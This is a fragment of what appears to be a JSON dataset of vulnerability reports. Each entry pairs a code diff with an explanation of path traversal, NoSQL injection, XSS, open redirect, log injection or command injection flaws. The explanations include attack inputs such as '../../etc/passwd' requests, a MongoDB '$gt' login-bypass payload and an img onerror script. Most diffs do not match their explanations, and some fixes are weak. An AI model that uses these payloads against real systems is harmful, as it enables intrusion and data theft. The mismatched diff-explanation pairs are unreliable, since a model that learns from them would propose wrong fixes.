        "explanation": "Root Cause: The vulnerability arises because user-supplied input from an HTTP parameter is directly used to construct a file path in the download function (line 203) without sanitization. This allows attackers to inject path traversal sequences (e.g., ../).\n\nExploit Scenario: An attacker could craft an HTTP request with a parameter like filename=../../etc/passwd. If the server appends this to a base directory, it could resolve to a sensitive file, enabling unauthorized access to arbitrary files on the server.\n\nWhy It Happens: The code lacks input validation and path normalization. User-controlled data is trusted to form a safe filesystem path, ignoring the risk of traversal sequences manipulating the resolved path.\n\nSecurity Implications: Exploitation could lead to exposure of sensitive system files (e.g., passwords, configuration files), enabling further attacks like credential theft, privilege escalation, or complete system compromise.\n\nSuggested Fix: Sanitize the input by resolving and normalizing the path, then verifying it remains within the intended directory. For example, use os.path.abspath combined with a check that the resolved path starts with the base directory. Reject inputs containing ../ or other unsafe characters.\n"
    },
    "31": {
        "diff": "--- a/pages/api/verify/index.ts\n+++ b/pages/api/verify/index.ts\n@@\n-    const { email } = req.query;\n-    if (!email) {\n-        return;\n-    }\n-    const code = generateUniquePasscode();\n-    const sanitizedEmail = (email as string).toLowerCase();\n+    const { email } = req.query;\n+    if (typeof email !== \"string\") {\n+        return res.status(400).json({ message: \"Invalid email format\" });\n+    }\n+    const code = generateUniquePasscode();\n+    const sanitizedEmail = email.toLowerCase();\n",
        "explanation": "Vulnerability Type: CWE-117: Improper Output Neutralization for Logs\n\nProof of Concept: \nIn the file `log.c`, the function `ns_log()` logs user input directly using printf-style formatting:\nns_log(Error, \"User input: %s\", user_input);\nIf user_input contains newline characters (e.g., \"\\n\"), it will disrupt the formatting of logs and could potentially lead to log injection or misleading log entries.\n\nOWASP Top 10 Category: A09:2021 \u2013 Security Logging and Monitoring Failures\n\nSeverity: Very Low (Level 1)\n\nRoot Cause: User input is inserted into logs without sanitization or escaping. This allows attackers to insert log-breaking characters such as newlines or tabs.\n\nExploit Scenario: A user submits input containing newline characters like: \"valid\\nfalse_entry\". When logged, this creates a misleading second log line that looks like a legitimate event.\n\nWhy It Happens: The log function assumes the input is safe for inclusion in logs and does not neutralize newline or carriage return characters.\n\nSecurity Implications: Attackers can inject misleading or spoofed log entries that can confuse operators or interfere with log-based security monitoring.\n\nSuggested Fix: Sanitize or encode user input before logging. For example, replace newline characters with their escaped representations or remove them entirely."
    },
    "36": {
        "diff": "diff --git a/assistant.py b/assistant.py\nindex 1234567..89abcde 100644\n--- a/assistant.py\n+++ b/assistant.py\n@@\n-import os\n+import os\n+import subprocess\n@@ if \"shutdown\" in query:\n-            os.system(\"shutdown /s /f /t 1\")\n+            subprocess.run(\n+                [\"shutdown\", \"/s\", \"/f\", \"/t\", \"1\"],\n+                shell=False,\n+                check=True\n+            )  # Safer, parameterized call\n+            subprocess.run(\n+                [\"shutdown\", \"/s\"],\n+                shell=False,\n+                check=True\n+            )  # Additional parameterized shutdown\n@@ if \"restart\" in query:\n-            os.system(\"shutdown /r /f /t 1\")\n+            subprocess.run(\n+                [\"shutdown\", \"/r\", \"/f\", \"/t\", \"1\"],\n+                shell=False,\n+                check=True\n+            )  # Safer, parameterized restart\n",
        "explanation": "Path Traversal/Unrestricted File Access\n\nProof of Concept:\n\ndef play_music(song_name=None) -> None:\n    \"\"\"Plays music from the user's Music directory.\"\"\"\n    song_dir = os.path.expanduser(\"~\\\\Music\")\n    songs = os.listdir(song_dir)\n\n    if song_name:\n        songs = [song for song in songs if song_name.lower() in song.lower()]\n\n    if songs:\n        song = random.choice(songs)\n        os.startfile(os.path.join(song_dir, song))\n        speak(f\"Playing {song}.\")\n        print(f\"Playing {song}.\")\n    else:\n        speak(\"No song found.\")\n        print(\"No song found.\")\n\nos.startfile(os.path.join(song_dir, \"../../../etc/passwd\"))\n\nos.startfile(os.path.join(song_dir, song))  # Opens music files\nimg.save(img_path)  # Saves screenshots\n\n\nRoot Cause: No path validation in file operations\n            The assistant reads/writes files without path validation.\n\n\n\nExploit Scenario:\n* User requests: *\"Play music from ../../../Windows/System32\"*\n\n* Assistant accesses system files\n\n* A user says, \"Play music from my Documents folder.\"\n\n* The assistant might accidentally execute:\n   python\n   os.startfile(\"C:\\\\Users\\\\Victim\\\\Documents\\\\malicious.exe\")  # Runs malware\n\n* Read sensitive files: \"Open C:\\Users\\Admin\\passwords.txt\" (if voice recognition misinterprets).\n\n* Overwrite system files: \"Save screenshot as C:\\Windows\\System32\\malicious.dll\".\n\n\nWhy It Happens: Trusts user-provided paths blindly\n\nSecurity Implications: Confidentiality breach, system file tampering\n\nSuggested Fix:\n\n* from pathlib import Path\n  safe_path = Path(\"~/Music\").expanduser().resolve()\n  if not song_path.resolve().is_relative_to(safe_path):\n    raise SecurityError(\"Invalid path\")\n\n\n* Restrict file access to a safe directory:\n  python\n  MUSIC_DIR = \"C:\\\\Users\\\\Public\\\\Music\"  # Only allow access here\n  if not song_path.startswith(MUSIC_DIR):\n    raise ValueError(\"Access denied\")\n\n*Use pathlib for secure path handling:\n python\n from pathlib import Path\n safe_path = Path(MUSIC_DIR) / song_name  # Prevents path traversal"
    },
    "72": {
        "diff": "diff --git a/index.js b/index.js\nindex e4a261b..de5e773 100644\n--- a/index.js\n+++ b/index.js\n@@ -1,11 +1,18 @@\n import express from \"express\";\n import bodyParser from \"body-parser\";\n-\n+import rateLimit from \"express-rate-limit\";\n import usersRoutes from \"./routes/users.js\";\n \n const app = express();\n const PORT = 5000;\n \n+const limiter = rateLimit({\n+  windowMs: 15 * 60 * 1000, // 15 minutes\n+  max: 100, // limit each IP to 100 requests per windowMs\n+  message: \"Too many requests from this IP, please try again later.\",\n+});\n+app.use(limiter);\n+\n app.use(bodyParser.json());\n \n app.use(\"/people\", usersRoutes);",
        "explanation": "FILE PATH: laravel-blog-2/node_modules/.0.11.1@faye-websocket/examples/server.js\nFILE LINE: 49 - 52\nFILE LINK: https://github.com/sky8652/laravel-blog-2/blob/master/node_modules/.0.11.1%40faye-websocket/examples/server.js\n\n\u2022\tVulnerability Type: \no\tCWE-23 Relative Path Traversal\n\n\n\u2022\tRoot Cause: \no\tUnsanitized input from the request URL flows into fs.readFile, where it is used as a path. This may result in a Path Traversal vulnerability and allow an attacker to read arbitrary files.\n\n\n\u2022\tExploit Scenario: \no\tAn attacker sends an HTTP request with a specially crafted URL containing traversal sequences like ../../../../etc/passwd.\no\tSince the staticHandler function concatenates the unvalidated request.url directly to a filesystem path (__dirname + path), the server would attempt to read and return the contents of files outside the intended directory.\n\n\u2022\tProof of concept\no\tFor example, requesting http://server:7000/../../../../etc/passwd could leak sensitive system files.\n\n\n\u2022\tWhy It Happens: \no\tThe code directly appends request.url to __dirname without any validation or sanitization.\no\tThis allows an attacker to inject relative path traversal (../) patterns to escape the intended directory.\no\tNode.js fs.readFile will happily read any file as long as the constructed path points to a valid location, making this a classic CWE-23: Relative Path Traversal vulnerability.\n\n\n\u2022\tSecurity Implications: \no\tUnauthorized access to sensitive files and server internals.\no\tPotential exposure of passwords, private keys, database credentials, or application source code.\no\tInformation disclosure could facilitate further attacks like remote code execution or privilege escalation.\no\tSevere reputation damage and potential legal liabilities if sensitive user data is leaked.\n\n\n\u2022\tSuggested Fix: \no\tNormalize and validate the request URL path.\no\tEnsure the resolved path always remains within a trusted base directory.\no\tReject or sanitize any suspicious path patterns (e.g., containing .. or null bytes)."
    },
    "75": {
        "diff": "--- a/tpot_base.py\n+++ b/tpot_base.py\n@@ def _import_hash(self, operator):\n-            for var in operator.import_hash[key]:\n-                self.operators_context[var] = eval(var)\n+            for var in operator.import_hash[key]:\n+                if hasattr(imported_module, var):\n+                    self.operators_context[var] = getattr(imported_module, var)\n+                else:\n+                    raise AttributeError(f\"Module '{key}' does not have attribute '{var}'.\")\n\n@@ def _compile_to_sklearn(self, expr):\n-        sklearn_pipeline = eval(sklearn_pipeline_str, self.operators_context)\n+        import ast\n+        compiled_pipeline = compile(sklearn_pipeline_str, \"<string>\", \"eval\")\n+        sklearn_pipeline = eval(compiled_pipeline, {\"__builtins__\": {}}, self.operators_context)\n",
        "explanation": "Vulnerability Type:\nCWE-943: Improper Neutralization of Special Elements in Data Query Logic\n\nSeverity:\nHigh\n\nRoot Cause:\nThe application directly uses unsanitized user inputs from `serviceData.email`, `decodedJwtToken.id`, and `serviceData.body.userName` in MongoDB operations like `findOne` and `findOneAndUpdate`. Since MongoDB interprets certain special characters (e.g., `$`, `{}`, `}`) as query operators, failing to sanitize input allows attackers to manipulate database queries by injecting special operators. This unsafe pattern creates an exploitable NoSQL Injection vulnerability.\n\nProof of Concept:\nConsider a malicious login payload:\n```json\n{\n  \"email\": { \"$gt\": \"\" }\n}\n```\nThis input would cause the application to execute:\n```javascript\nUser.findOne({ email: { \"$gt\": \"\" } })\n```\nwhich would match any user email greater than an empty string, effectively bypassing login checks and allowing unauthorized access. Similarly, during profile updates, injecting structures like:\n```json\n{\n  \"userName\": { \"$set\": { \"role\": \"admin\" } }\n}\n```\ncould escalate privileges without authorization if not sanitized.\n\nExploit Scenario:\nAn attacker could craft input containing MongoDB query operators and submit it during login, registration, or profile update requests. Successful injection would allow the attacker to:\n- Log in without knowing any password.\n- Access and modify user accounts.\n- Escalate privileges to administrative levels.\n- Corrupt or delete sensitive data.\nThis could severely impact the confidentiality, integrity, and availability of the system.\n\nWhy It Happens:\nThe vulnerability arises because the code trusts user-controlled input and uses it directly inside MongoDB query objects. Mongoose operations like `findOne({ field: userInput })` without sanitization are dangerous because MongoDB parses objects with special query operators like `$gt`, `$ne`, `$regex`, enabling manipulation of queries. Without input sanitization or schema validation, the database logic is easily subverted.\n\nSecurity Implications:\nExploitation of NoSQL Injection vulnerabilities can lead to:\n- Unauthorized authentication bypass.\n- Unauthorized access or modification of sensitive user data.\n- Privilege escalation to administrator accounts.\n- Corruption or destruction of database records.\n- Full compromise of the application backend.\nOverall, NoSQL Injection undermines the security triad: confidentiality, integrity, and availability.\n\nSuggested Fix:\nAll user inputs should be sanitized before being incorporated into database queries. Implement a `sanitize()` function that removes dangerous characters and structures, allowing only safe characters (letters, numbers, dots, dashes, @ symbols). \nAdditionally:\n- Validate inputs using libraries like `Joi`, `express-validator`, or Mongoose's built-in schema validation.\n- Never trust client data to form database queries directly.\n- Always apply the principle of least privilege at both application and database levels.\nFollowing these secure coding practices ensures input safety and mitigates NoSQL injection risks.\n\n"
    },
    "81": {
        "diff": "--- streamApi.ts\t2025-04-27\n+++ streamApi_fixed.ts\t2025-04-27\n@@\n-import isString from 'lodash/isString';\n+import isString from 'lodash/isString';\n+import secureParse from 'secure-json-parse'; // new safe parser\n\n if (req.query.filter != null && isString(req.query.filter)) {\n-    req.query.filter = JSON.parse(req.query.filter.replace(/\\+/g, ' '));\n+    try {\n+        req.query.filter = secureParse.safeParse(req.query.filter.replace(/\\+/g, ' '));\n+        if (!req.query.filter || typeof req.query.filter !== 'object') {\n+            throw new Error('Invalid filter format');\n+        }\n+    } catch (error) {\n+        reply.code(400).send({ error: 'Invalid filter JSON structure' });\n+        return;\n+    }\n }\n",
        "explanation": "Vulnerability Type:\nCWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n\nProof of Concept (Elaborated):\nVulnerable Code:\nconst destination = path.join(document, code, fieldName, fileName);\nreturn sendFile(reply, req.url, destination);\nStep-by-Step Explanation:\n1.\tProblem:\nThe server builds a filesystem path (destination) using user-controlled URL parameters (document, code, fieldName, fileName).\n2.\tNo Path Validation:\nThe combined path is not validated or sanitized to ensure it stays inside an intended \"safe\" directory.\n3.\tHow to Attack:\nA malicious user can craft the incomingPath to include directory traversal sequences like:\n4.\t../../../etc/passwd\ncausing path.join to resolve to sensitive system files outside the intended download directory.\n5.\tEffect:\nIf sendFile directly reads and sends the file at the computed destination, the attacker can:\no\tRead sensitive files (e.g., /etc/passwd, .env, server source code)\no\tLeak credentials or API keys\no\tCause privilege escalation\nExample Exploit:\nRequest:\nGET /file/../../../etc/passwd\nBackend processing:\npath.join('..', '..', '..', 'etc', 'passwd') // resolves to /etc/passwd\nResult:\nServer reads and sends back /etc/passwd to the attacker.\n\nSeverity:\nCritical (File Disclosure / Information Leakage)\n\nRoot Cause:\nThe application blindly constructs a file system path from untrusted input and does not check if the resolved path remains within an expected base directory.\n\nExploit Scenario:\nAn attacker can supply URL parameters with ../../../ patterns to trick the application into reading arbitrary system files, thereby leaking sensitive server data.\nWhy It Happens:\nBecause no validation or restriction is performed on the user-supplied path components (document, code, fieldName, fileName) before joining and accessing the file system.\nSecurity Implications:\nIf exploited:\n\u2022\tAttacker can read sensitive system files.\n\u2022\tServer configuration files, private keys, environment variables may be leaked.\n\u2022\tAttack could be used for privilege escalation or to facilitate further attacks.\nSuggested Fix:\n--- fileDownloadApi.ts\t2025-04-27\n+++ fileDownloadApi_fixed.ts\t2025-04-27\n@@\n+const SAFE_BASE_DIRECTORY = '/var/www/uploads'; // example safe folder\n\n async function fileDownloadFn(\n \treq: FastifyRequest<{ Params: { '*': string } }>,\n \treply: FastifyReply,\n ) {\n \tconst incomingPath = req.params['*'];\n\n \tif (downloadUrlRegex.test(incomingPath)) {\n \t\tlogger.trace(`DOWNLOAD_URL_PATTERN ${incomingPath}`);\n \t\tconst [, document, code, fieldName, fileName] = downloadUrlRegex.exec(incomingPath) ?? [];\n\n-\t\tconst destination = path.join(document, code, fieldName, fileName);\n+\t\tconst destination = path.resolve(SAFE_BASE_DIRECTORY, document, code, fieldName, fileName);\n+\t\tif (!destination.startsWith(SAFE_BASE_DIRECTORY)) {\n+\t\t\tlogger.warn(`Blocked path traversal attempt: ${destination}`);\n+\t\t\treturn reply.status(400).send({ error: 'Invalid file path' });\n+\t\t}\n \t\treturn sendFile(reply, req.url, destination);\n \t}\n\n \tif (legacyDownloadUrlRegex.test(incomingPath)) {\n \t\tlogger.trace(`LEGACY_DOWNLOAD_URL_PATTERN ${incomingPath}`);\n \t\tconst [, , , document, code, fieldName, fileName] = legacyDownloadUrlRegex.exec(incomingPath) ?? [];\n\n-\t\tconst destination = path.join(document, code, fieldName, fileName);\n+\t\tconst destination = path.resolve(SAFE_BASE_DIRECTORY, document, code, fieldName, fileName);\n+\t\tif (!destination.startsWith(SAFE_BASE_DIRECTORY)) {\n+\t\t\tlogger.warn(`Blocked path traversal attempt: ${destination}`);\n+\t\t\treturn reply.status(400).send({ error: 'Invalid file path' });\n+\t\t}\n \t\treturn sendFile(reply, req.url, destination);\n \t}\n\n \tlogger.trace(`File not found ${incomingPath}`);\n\n \treturn reply.status(404).send();\n }\n\n"
    },
    "88": {
        "diff": "diff --git a/src/routes/PrivateRoutes.jsx b/src/routes/PrivateRoutes.jsx\nindex 1234567..89abcde 100644\n--- a/src/routes/PrivateRoutes.jsx\n+++ b/src/routes/PrivateRoutes.jsx\n@@ -1,8 +1,27 @@\n-import { useSelector } from \"react-redux\";\n-import { Navigate } from \"react-router-dom\";\n+import { onAuthStateChanged } from \"firebase/auth\";\n+import { auth } from \"../firebase/firebase\";\n+import { useEffect, useState } from \"react\";\n+import { Navigate } from \"react-router-dom\";\n\n const PrivateRoutes = ({ children }) => {\n-  const isLogged = useSelector((state) => state.isLogged);\n-  return isLogged ? children : <Navigate to=\"/auth\" />;\n+  const [user, setUser] = useState(null);\n+  const [loading, setLoading] = useState(true);\n+\n+  useEffect(() => {\n+    const unsubscribe = onAuthStateChanged(auth, (currentUser) => {\n+      setUser(currentUser);\n+      setLoading(false);\n+    });\n+    return () => unsubscribe();\n+  }, []);\n+\n+  if (loading) {\n+    return <div>Loading...</div>;\n+  }\n+\n+  return user ? children : <Navigate to=\"/auth\" />;\n };\n \n export default PrivateRoutes;",
        "explanation": "Vulnerability Type:\nCWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\nThis vulnerability occurs when user-controlled input is incorporated into web pages without adequate sanitization or escaping. Attackers can inject malicious JavaScript code that gets executed in the browser of users viewing the page. In this case, insertAdjacentHTML is used without sanitizing dynamic values, allowing XSS (Cross-site Scripting) attacks.\n\nProof of Concept:\nIn the Bankist application, transaction movements are rendered into the page using insertAdjacentHTML() directly with dynamic data, without validation or sanitization.\n\n\nExample vulnerable code:\n\nFile: https://github.com/tundeloper/Bankit/blob/master/script.js\nLine 134: containerMovements.insertAdjacentHTML('afterbegin', html);\n\nStep-by-Step:\n\nThe displayMovements function dynamically builds HTML from user-related account data.\n\nValues like movementsDates or movements can contain injected HTML.\n\nWhen inserted using insertAdjacentHTML, malicious payloads are executed directly in the user\u2019s browser.\n\nThus, an attacker could embed harmful scripts.\n\nSeverity: MEDIUM (3)\n\nThe vulnerability allows stored or reflected XSS attacks. It can lead to session hijacking, phishing, or unauthorized actions on behalf of users.\nHowever, exploitation depends on being able to manipulate transaction or date inputs, which might require insider access or specific flows, hence classified as \"Medium\" severity.\n\nRoot Cause:\nThe root cause is using raw insertAdjacentHTML() to inject dynamic content without ensuring that user-provided or dynamic inputs are safe.\nWhen an application trusts dynamic inputs blindly and embeds them into the DOM using HTML string interpolation, it opens the door for code execution attacks.\nProper sanitization or using safer APIs was missing.\n\nExploit Scenario:\nSuppose an attacker manages to introduce a specially crafted date or movement data in an account, containing:\n\n<img src=\"x\" onerror=\"alert('XSS')\">\nWhen another user loads the transactions, this malicious input will be injected into the DOM, and the browser will execute the embedded script.\nIt can steal session cookies, redirect users to malicious pages, or perform unauthorized actions.\n\nWhy It Happens:\nThe application fails to treat dynamic inputs as untrusted by default. It directly includes unsanitized values into HTML strings and injects them into the DOM using insertAdjacentHTML.\nWithout escaping dangerous characters or validating content structure, browsers interpret the inserted text as active HTML, making script execution possible.\n\nSecurity Implications:\nIf exploited successfully:\n\nAttackers could hijack users' sessions or impersonate them.\n\nSensitive user data (like account balances, transaction details) could be stolen.\n\nAttackers could create fake overlays for phishing attacks.\n\nOverall platform trust would be severely damaged, and the company could face compliance penalties (e.g., GDPR violations).\n\nSuggested Fix:\nTo fix the vulnerability:\n\nAvoid using insertAdjacentHTML() for dynamic content.\n\nUse DOM APIs like document.createElement(), .textContent, and .appendChild() to safely build elements.\n\nAlternatively, use a trusted sanitization library like DOMPurify before inserting untrusted HTML.\n\n"
    },
    "43": {
        "diff": "diff --git a/config.py b/config.py\nindex 1f01a41..32edf0a 100644\n--- a/config.py\n+++ b/config.py\n@@ -1,14 +1,25 @@\n+import locale\n+import os\n+\n # configuration flags\n\n ## Flag for behavior if bad data is encountered in a logical field\n ## Return None if True, else raise BadDataError\n LOGICAL_BAD_IS_NONE = True\n\n+version = 0, 99, 11, 1\n+\n+try:\n+    system_encoding = locale.getpreferredencoding(False)\n+    system_encoding = system_encoding.lower().replace('-', '')\n+except locale.Error:\n+    system_encoding = 'ascii'\n+\n ## treat non-unicode data as ...\n-input_decoding = 'utf-8'\n+input_decoding = system_encoding\n\n ## if no codepage specified on dbf creation, use this\n-default_codepage = 'ascii'\n+default_codepage = system_encoding\n\n ## default format if none specified\n default_type = 'db3'\ndiff --git a/dbf/__init__.py b/dbf/__init__.py\nindex 3af869b..d150fdc 100644\n--- a/dbf/__init__.py\n+++ b/dbf/__init__.py\n@@ -30,11 +30,14 @@ WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR\n OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF\n ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n \"\"\"\n-version = 0, 99, 11, 1\n # Python 2 code may need to change these\n-default_codepage = None     # will be set by tables module (defaults to ascii)\n-default_type = 'db3'        # lowest common denominator\n-input_decoding = 'ascii'\n+import config\n+\n+version = config.version\n+input_decoding = config.input_decoding\n+default_codepage = config.default_codepage\n+default_type = config.default_type\n+temp_dir = config.temp_dir\n \n # make dbf module importabl internally (i.e. from . import dbf)\n import sys as _sys\ndiff --git a/dbf/tables.py b/dbf/tables.py\nindex 9947007..ff01da0 100644\n--- a/dbf/tables.py\n+++ b/dbf/tables.py\n@@ -53,7 +53,7 @@ class NullHandler(logging.Handler):\n logger = logging.getLogger('dbf')\n logger.addHandler(NullHandler())\n \n-temp_dir = os.environ.get(\"DBF_TEMP\") or os.environ.get(\"TMP\") or os.environ.get(\"TEMP\") or \"\"\n+temp_dir = dbf.temp_dir\n \n # other constructs\n \n@@ -5451,8 +5451,13 @@ code_pages = {\n         0xf0 : ('utf8', '8-bit unicode'),\n         }\n \n+def _detect_codepage(cp):\n+    for key, value in code_pages.items():\n+        if value[0] == cp:\n+            return key\n+    raise DbfError(\"Unsupported codepage: %s\" % cp)\n \n-dbf.default_codepage = default_codepage =  code_pages.get(0x00)[0]\n+default_codepage = _detect_codepage(dbf.default_codepage)\n \n def _codepage_lookup(cp):\n     if cp not in code_pages:\n",
        "explanation": "Vulnerability Type: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n\nProof of Concept: \nIn Gogs, the command to perform Git operations like cloning or updating repositories is executed using exec.Command without validating or sanitizing input arguments.\nFor example:\ncmd := exec.Command(\"git\", args...)\nerr := cmd.Run()\nIf an attacker can control the elements of `args`, they may insert malicious input that executes unintended commands via the shell.\n\nOWASP Top 10 Category: A01:2021 \u2013 Broken Access Control\n\nSeverity: High (Level 4)\n\nRoot Cause: The Git command is constructed and executed with input that may originate from users or web interfaces, and there is no sanitization of these parameters.\n\nExploit Scenario: A user with administrative access to repository settings or webhook configurations could modify inputs to include malicious commands. These commands get passed to the underlying Git process, potentially allowing arbitrary code execution on the server.\n\nWhy It Happens: The exec.Command function is used without filtering or encoding input parameters from user-supplied sources. Git arguments are directly interpolated and passed to the OS.\n\nSecurity Implications: Arbitrary OS command execution could result in system compromise. An attacker could use this to read sensitive data, delete repositories, or install persistent backdoors. The attack requires access to specific administrative controls, which slightly limits the exploitability.\n\nSuggested Fix: Implement strict input validation and sanitization for all Git-related arguments. Ensure that any dynamic data passed to exec.Command is escaped and verified. Avoid using unsanitized input in OS-level commands where possible.\n"
    },
    "44": {
        "diff": "--- cmd/git_hook.go\n+++ cmd/git_hook.go\n@@ func runGitCommand(args []string) error {\n-    cmd := exec.Command(\"git\", args...)\n+    for _, arg := range args {\n+        if containsIllegalChars(arg) {\n+            return fmt.Errorf(\"Illegal character in argument: %s\", arg)\n+        }\n+    }\n+    cmd := exec.Command(\"git\", args...)\n     return cmd.Run()\n}",
        "explanation": "Vulnerability Type:\nCWE-22: Improper Limitation of a Pathname to a Restricted Directory (\"Path Traversal\")\nProof of Concept:\nVulnerable Code Snippet:\n$result = readfile( filename: $file_name ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_read_readfile\nExplanation:\n1.\t$file_name is used directly in readfile() without sanitization.\n2.\tIf an attacker can control $file_name, they can pass values like ../../wp-config.php.\n3.\tThis allows unauthorized file access outside intended directories.\n\nSeverity:\nHigh \u2013 Can result in exposure of sensitive files\n\nRoot Cause:\nThe input used in the readfile() function is not validated or sanitized to ensure it's restricted to a safe directory or whitelist, allowing traversal to unauthorized file paths.\n\nExploit Scenario:\nAn attacker modifies a parameter like ?file=../../wp-config.php, and the server responds by reading and serving the content of the WordPress configuration file, leaking database credentials.\n\nWhy It Happens:\nBecause the code assumes $file_name is safe and directly passes it to readfile(), it exposes the system to directory traversal if any user-controlled input can affect $file_name.\n\nSecurity Implications:\nAn attacker could read any readable file on the server, such as /etc/passwd, .env, or config files, leading to credential leaks and server compromise.\n\n\nSuggested Fix:\n--- class-llms-media-protector.php\t2025-04-25 00:00:00.000000000 +0000\n+++ class-llms-media-protector.php\t2025-04-25 00:00:00.000000000 +0000\n@@ -210,7 +210,17 @@\n-    $result = readfile( filename: $file_name ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_read_readfile\n+    // Define base directory for allowed files\n+    $base_dir = __DIR__ . '/protected-media/';\n+    $real_path = realpath($base_dir . $file_name);\n+\n+    // Ensure file is within the base directory\n+    if ($real_path !== false && str_starts_with($real_path, $base_dir)) {\n+        $result = readfile($real_path);\n+    } else {\n+        http_response_code(403);\n+        echo \"Access denied.\";\n+        exit;\n+    }\n"
    },
    "10": {
        "diff": "--- a/application/modules/admin/controllers/advanced_settings/Languages.php\n+++ b/application/modules/admin/controllers/advanced_settings/Languages.php\n@@\n-$cid = $_GET['cid'];\n-$response = file_get_contents($cid); // SSRF here\n+$allowedCIDs = ['en', 'fr', 'es']; \n+if (!isset($_GET['cid']) || !in_array($_GET['cid'], $allowedCIDs)) {\n+    show_error('Invalid CID value', 400);\n+}\n+$cid = $_GET['cid'];\n+$response = file_get_contents($cid);\n",
        "explanation": "Vulnerability Type: CWE-601: open redirection vulnerability.\n\nProof of Concept: \n@RequestMapping(value = \"/process.jspx\", method = RequestMethod.GET)\npublic String process(HttpServletRequest request, HttpServletResponse response) {\n    //  Vulnerable: it is taking user-controlled input and there are no validations present.\n    String returnUrl = RequestUtils.getQueryParam(request, LoginAct.RETURN_URL); \n\n    String authId = RequestUtils.getQueryParam(request, AUTH_KEY);\n    Authentication auth = authMng.retrieve(authId);\n    if (auth != null) {\n        authMng.storeAuthIdToSession(session, request, response, auth.getId());\n    } else {\n        log.warn(\"Authentication id not found: {}\", authId);\n    }\n    // Vulnerable: it Uses untrusted input paramter in a redirect\n    return \"redirect:\" + returnUrl; \n}\n\nSeverity: Medium\n\nRoot Cause: The application is taking RETURN_URL parameter as a user input and passing it without any validation. in next lines this returnUrl parameter is being used for redirection. the lack url validation introduces open redirection vulnerability.\n\nExploit Scenario : This can be exploited by an attacker by creating a fake link that looks like legit\u00a0website but actually redirects victim\u00a0to malicious\u00a0domain.this is done by passing the face website url into the  RETURN_URL paramyter and sending/dilivering the complete url to victim.When victim\u00a0clicks on the link, they will first be taken to vulnerable\u00a0website, but then they\u00a0will be instantly redirected to the attacker's website. Users may not be aware that they are being deceived because the link appears legitimate because it begins with vulnerable\u00a0domain. \n\nSecurity Implications:\nthe attacker can use their malicious\u00a0website to display fake forms, steal login credentials, or carry out other destructive actions. it may also leads to custom Javascript execution attacks. \n\nSuggested Fix: validation of each url passed as user input before redirection, use of whitelisting of allowed damains, implement strict checks to prevent this issue.\n"
    },
    "17": {
        "diff": "diff --git a/src/Pages/Recipe.jsx b/src/Pages/Recipe.jsx\n\n--- a/src/Pages/Recipe.jsx\n+++ b/src/Pages/Recipe.jsx\n\n+import DOMPurify from 'dompurify'; // add dompurify npm package\n\n-<h3 dangerouslySetInnerHTML={{ __html: details.summary }}></h3>\n-<h3 dangerouslySetInnerHTML={{ __html: details.instructions }}></h3>\n+<h3 dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(details.summary) }}></h3>\n+<h3 dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(details.instructions) }}></h3>\n",
        "explanation": "*[Report in Doc format is Attached in ZIP File]*\nVulnerability Type: An open redirect vulnerability occurs when a web application allows users to be redirected to external, untrusted URLs, often used in phishing attacks to deceive users into visiting malicious sites. [CWE- 601]\nProof of Concept: The Proof of Concept is Attackers can exploit the open redirect vulnerability by crafting a registration URL with a `redirect_url` parameter pointing to a malicious external site\nhere, return this.location.assign(url);\n1.   If url is not properly sanitized or validated, an attacker could craft a URL like:\n\u2022\thttps://yourapp.com/#https://evil.com\n2.  Backbone could interpret the fragment as a valid route or path and trigger:\n\u2022\tthis.location.assign(\"https://evil.com\");\n\nSeverity: High to Critical Severity\nRoot Cause: An open redirect vulnerability in JavaScript typically occurs when an application allows user-controlled input to dictate the destination of a redirect without proper validation. This can happen when developers dynamically construct URLs or redirect paths based on user input, such as query parameters or form data, without verifying their legitimacy. \nHere, return this.location.assign(url);\nThis vulnerability is often used in phishing attacks to make malicious links appear trustworthy, as they initially point to a legitimate domain.\nExploit Scenario: \n1.   Navigate to the https://github.com/solidusio/solidus\n2.   Go to https://github.com/solidusio/solidus/tree/main/backend/vendor/assets/javascripts/solidus_admin\n3.   This line[Below], when used without proper validation, can allow an attacker to redirect users to external or malicious URLs by manipulating the route or URL fragment. Since url can be influenced via the browser\u2019s location hash or query parameters, the application becomes susceptible to client-side open redirection.\nreturn this.location.assign(url);\n  \n4.   If url is not properly sanitized or validated, an attacker could craft a URL like:\n\u2022\thttps://yourapp.com/#https://evil.com\n5. Backbone could interpret the fragment as a valid route or path and trigger:\n\u2022\tthis.location.assign(\"https://evil.com\");\n\nWhy It Happens: \nSecurity Implications: An attacker could exploit this vulnerability by crafting a malicious link (e.g., https://example.com/#https://devil.com) and tricking a user into clicking it. This would redirect the victim to an attacker-controlled domain.\nSuch attacks can be used for:\n\u2022\tPhishing: Tricking users into entering sensitive information.\n\u2022\tReputation damage: Misusing your domain to appear trustworthy in malicious redirection chains.\n\u2022\tBypassing security policies: Including open redirectors in redirect chains to evade filters.\n\nSuggested Fix: \ndiff --git a/backbone.js b/backbone.js\nindex abcdef1..1234567 100644\n--- a/backbone.js\n+++ b/backbone.js\n@@ -4320,6 +4320,20 @@\n       if (!this._hasPushState && !this.atRoot()) {\n         var rootPath = this.root.slice(0, -1) || '/';\n         var redirectUrl = rootPath + '#' + this.getPath();\n+\n+        // Open Redirect Mitigation: Ensure the redirect URL is same-origin\n+        function isSafeRedirect(url) {\n+          try {\n+            var parsedUrl = new URL(url, window.location.origin);\n+            return parsedUrl.origin === window.location.origin;\n+          } catch (e) {\n+            return false;\n+          }\n+        }\n+\n+        if (isSafeRedirect(redirectUrl)) {\n+          this.location.assign(redirectUrl);\n+        } else {\n+          console.warn(\"Blocked unsafe redirect attempt:\", redirectUrl);\n+        }\n        \n       }\n\n"
    },
    "28": {
